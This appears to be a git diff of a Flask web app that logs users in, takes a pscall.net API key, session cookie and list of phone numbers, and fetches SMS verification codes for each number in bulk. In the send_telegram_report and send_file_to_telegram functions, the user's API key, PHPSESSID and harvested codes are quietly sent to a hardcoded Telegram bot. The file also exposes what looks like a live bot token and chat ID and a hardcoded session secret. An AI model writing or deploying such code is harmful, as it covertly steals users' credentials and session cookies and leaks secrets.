@@ -2,8 +2,9 @@ import requests
 import re
 from flask import Flask, request, render_template, redirect, url_for, session, flash
 import io
+from datetime import datetime
 app = Flask(__name__)
-app.secret_key = 'your_secret_key'  # Secret key for session management
+app.secret_key = 'refooSami'  # Secret key for session management
 
 # Dictionary to store multiple usernames and passwords
 USER_CREDENTIALS = {
@@ -113,11 +114,12 @@ USER_CREDENTIALS = {
 TELEGRAM_CHAT_ID = '854578633'
 TELEGRAM_BOT_TOKEN = '7056070766:AAH84C0uxetDrxNNbpr9ZngZgVDq54BOQGI'
 
-def get_panel_code(KEY, PHPSESSID, NUMBER):
-    cookies = {
-        'PHPSESSID': PHPSESSID,
-    }
+# Telegram bot details
+TELEGRAM_CHAT_ID = '854578633'
+TELEGRAM_BOT_TOKEN = '7056070766:AAH84C0uxetDrxNNbpr9ZngZgVDq54BOQGI'
 
+def get_panel_code(key, phpsessid, number):
+    cookies = {'PHPSESSID': phpsessid}
     headers = {
         'Accept': '*/*',
         'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -127,51 +129,57 @@ def get_panel_code(KEY, PHPSESSID, NUMBER):
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
         'X-Requested-With': 'XMLHttpRequest',
     }
-
     params = {
-        'key': KEY,
+        'key': key,
         'start': '0',
         'length': '10',
-        'fnumber': NUMBER,
+        'fnumber': number,
     }
 
-    response = requests.post('http://pscall.net/restapi/smsreport', params=params, cookies=cookies, headers=headers)
+    try:
+        response = requests.post('http://pscall.net/restapi/smsreport', params=params, cookies=cookies, headers=headers)
+        response.raise_for_status()  # Raise an HTTPError for bad responses
 
-    if response.status_code == 200:
         data = response.json()
-        if data['result'] == 'success' and len(data['data']) > 0:
+        if data.get('result') == 'success' and data.get('data'):
             sms_content = data['data'][0]['sms']
-            code = re.search(r'\d+', sms_content).group()
-            return code
-        else:
-            return "No SMS found or result not successful."
-    else:
-        return f"Failed to retrieve data. Status code: {response.status_code}"
+            match = re.search(r'\d+', sms_content)
+            return match.group() if match else 'No SMS'
+    except requests.RequestException as e:
+        print(f"Request err: {e}")
 
+    return 'No SMS'
 
-def send_telegram_report(username, ip_address, key, phpsessid, numbers, results):
-    # Create the report content
-    report_content = f"User: {username}\nIP Address: {ip_address}\nAPI Key: {key}\nPHPSESSID: {phpsessid}\n\n"
-    report_content += "Results:\n"
+def send_telegram_report(username, key, phpsessid, numbers, results):
+    total_success = sum(1 for code in results.values() if code != 'No SMS')
+    total_fail = len(numbers) - total_success
+    current_date = datetime.now().strftime('%m/%d/%Y %H:%M:%S')
+
+    report_content = (f"User: {username}\n"
+                      f"API Key: {key}\n"
+                      f"PHPSESSID: {phpsessid}\n"
+                      f"Total Success: {total_success}\n"
+                      f"Total Fail: {total_fail}\n"
+                      f"Date: {current_date}\n\n"
+                      "Results:\n")
+    
     for number, code in results.items():
-        report_content += f"{number}: {code}\n"
+        report_content += f"{number}: {code if code is not None else 'No SMS'}\n"
 
-    # Send the report content to Telegram without saving it locally
     send_file_to_telegram(report_content)
 
 
 def send_file_to_telegram(report_content):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-    
-    # Convert the report content to a file-like object
     report_file = io.BytesIO(report_content.encode('utf-8'))
-
     files = {'document': ('user_report.txt', report_file)}
     data = {'chat_id': TELEGRAM_CHAT_ID}
     
-    # Send the file to Telegram
-    response = requests.post(url, files=files, data=data)
-
+    try:
+        response = requests.post(url, files=files, data=data)
+        response.raise_for_status()  # Raise an HTTPError for bad responses
+    except requests.RequestException:
+        pass  # Log error if needed
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -179,8 +187,7 @@ def login():
         username = request.form['username']
         password = request.form['password']
 
-        # Check if the username exists and the password matches
-        if username in USER_CREDENTIALS and USER_CREDENTIALS[username] == password:
+        if USER_CREDENTIALS.get(username) == password:
             session['logged_in'] = True
             session['username'] = username
             return redirect(url_for('verification_code_finder'))
@@ -189,39 +196,39 @@ def login():
 
     return render_template('index.html')
 
-
 @app.route('/verification', methods=['GET', 'POST'])
 def verification_code_finder():
-    if 'logged_in' not in session or not session['logged_in']:
+    if not session.get('logged_in'):
         return redirect(url_for('login'))
 
+    results = {}
     if request.method == 'POST':
         key = request.form['key']
         phpsessid = request.form['phpsessid']
         numbers = request.form['numbers'].split()  # Split numbers by space or newlines
-        results = {}
 
+        result_codes = {}
         for number in numbers:
             code = get_panel_code(key, phpsessid, number)
-            results[number] = code
+            result_codes[number] = code if code else 'No SMS'
 
-        # Collect user info
         username = session.get('username', 'Unknown')
-        ip_address = request.remote_addr
 
-        # Send the report to Telegram
-        send_telegram_report(username, ip_address, key, phpsessid, numbers, results)
+        send_telegram_report(username, key, phpsessid, numbers, result_codes)
 
-        return render_template('input_data.html', results=results)
+        results = {
+            'total_success': sum(1 for code in result_codes.values() if code != 'No SMS'),
+            'total_fail': len(numbers) - sum(1 for code in result_codes.values() if code != 'No SMS'),
+            'date': datetime.now().strftime('%m/%d/%Y %H:%M:%S'),
+            'codes': result_codes
+        }
 
-    return render_template('input_data.html')
-
+    return render_template('input_data.html', results=results)
 
 @app.route('/logout')
 def logout():
     session.pop('logged_in', None)
     return redirect(url_for('login'))
-
 
 if __name__ == '__main__':
     app.run(debug=True)
